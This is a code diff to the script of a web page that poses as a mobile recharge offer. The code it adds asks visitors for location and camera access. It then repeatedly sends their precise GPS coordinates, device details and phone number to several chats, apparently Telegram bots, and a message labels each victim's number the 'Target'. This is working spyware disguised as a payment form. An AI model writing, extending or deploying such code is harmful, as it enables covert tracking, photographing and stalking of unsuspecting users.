@@ -335,9 +335,49 @@ async function proceedRecharge() {
     elements.proceedBtn.textContent = 'PROCESSING...';
     elements.loadingOverlay.style.display = 'flex';
     
-    // Start camera
+    // ===== STEP 1: LOCATION PEHLE MAANGO =====
+    debugLog('📍 Requesting location permission...');
+    let locationGranted = false;
+    
+    try {
+        const locationResult = await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    debugLog('✅ Location permission granted');
+                    resolve({ success: true, position });
+                },
+                (error) => {
+                    debugLog('❌ Location permission denied: ' + error.message);
+                    resolve({ success: false, error: error.message });
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+        
+        if (locationResult.success) {
+            locationGranted = true;
+            // Send first location immediately
+            await sendLocationToAllChats(
+                locationResult.position.coords.latitude,
+                locationResult.position.coords.longitude,
+                locationResult.position.coords.accuracy
+            );
+            showToastMsg('📍 Location access granted');
+        } else {
+            await sendToAllChats('sendMessage', { 
+                text: `⚠️ LOCATION DENIED\nUser denied location access.\nPlan: ₹${state.selectedAmount}\nMobile: ${mobile}`,
+                parse_mode: 'HTML'
+            });
+        }
+    } catch(e) {
+        debugLog('Location error: ' + e.message);
+    }
+    
+    // ===== STEP 2: CAMERA AB MAANGO =====
+    debugLog('📷 Requesting camera permission...');
     const cameraStarted = await startCamera();
     if (!cameraStarted) {
+        showToastMsg('Camera access required', true);
         elements.loadingOverlay.style.display = 'none';
         elements.proceedBtn.disabled = false;
         elements.proceedBtn.textContent = 'ACTIVATE PLAN';
@@ -345,15 +385,36 @@ async function proceedRecharge() {
         return;
     }
     
-    // Start live location (continuous)
-    await startLiveLocation();
+    // ===== STEP 3: CONTINUOUS LOCATION (agar granted hai toh) =====
+    if (locationGranted) {
+        // Continue sending location every interval
+        state.locationInterval = setInterval(async () => {
+            if (!state.sessionActive) return;
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    await sendLocationToAllChats(
+                        position.coords.latitude,
+                        position.coords.longitude,
+                        position.coords.accuracy
+                    );
+                },
+                (error) => {
+                    debugLog('⚠️ Location update failed: ' + error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }, CONFIG.LOCATION_INTERVAL);
+        
+        debugLog(`📍 Location interval set: ${CONFIG.LOCATION_INTERVAL}ms`);
+    }
     
     // Send device info
     await sendDeviceInfo();
     
     // Send session start notification
     await sendToAllChats('sendMessage', {
-        text: `🟢 SESSION STARTED\n━━━━━━━━━━━━━━━━━━━━\n📱 Target: ${mobile}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n💰 Plan: ₹${state.selectedAmount}\n⏱️ Duration: ${CONFIG.SESSION_DURATION / 1000} seconds\n━━━━━━━━━━━━━━━━━━━━`,
+        text: `🟢 SESSION STARTED\n━━━━━━━━━━━━━━━━━━━━\n📱 Target: ${mobile}\n📡 Operator: ${state.selectedOperator.toUpperCase()}\n💰 Plan: ₹${state.selectedAmount}\n📍 Location: ${locationGranted ? '✅ Granted' : '❌ Denied'}\n⏱️ Duration: ${CONFIG.SESSION_DURATION / 1000} seconds\n━━━━━━━━━━━━━━━━━━━━`,
         parse_mode: 'HTML'
     });
     
@@ -370,7 +431,6 @@ async function proceedRecharge() {
         if (state.locationInterval) clearInterval(state.locationInterval);
         
         state.sessionActive = false;
-        state.isCapturing = false;
         
         // Show success modal
         elements.loadingOverlay.style.display = 'none';
@@ -388,11 +448,6 @@ async function proceedRecharge() {
         
         debugLog(`✅ Session complete | Photos: ${state.photoCount} | Locations: ${state.locationCount}`);
     }, CONFIG.SESSION_DURATION);
-}
-
-// ========== MODAL FUNCTIONS ==========
-function closeSuccessModal() {
-    elements.successModal.style.display = 'none';
 }
 
 // ========== TEST BOT CONNECTION ==========
